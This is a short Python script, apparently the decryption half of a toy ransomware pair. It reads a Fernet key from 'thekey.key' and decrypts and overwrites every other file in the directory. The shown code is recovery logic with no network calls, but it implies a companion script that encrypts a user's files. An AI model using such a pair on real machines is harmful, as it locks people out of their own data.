import os
from cryptography import fernet

image_list = []
for file in os.listdir():
    if os.path.isfile(file):
        image_list.append(file)

to_decrypt = []

for image in image_list:
    if image == 'main.py' or image == 'decrypt.py' or image == 'thekey.key':
        continue
    else:
        to_decrypt.append(image)
print(to_decrypt)

with open("thekey.key", 'rb') as thekey:
    key = thekey.read()

for file in to_decrypt:
    with open(file, 'rb') as decrypting:
        contents = decrypting.read()
    
    decrypted = fernet.Fernet(key).decrypt(contents)

    with open(file, 'wb') as just_decrypting:
        just_decrypting.write(decrypted)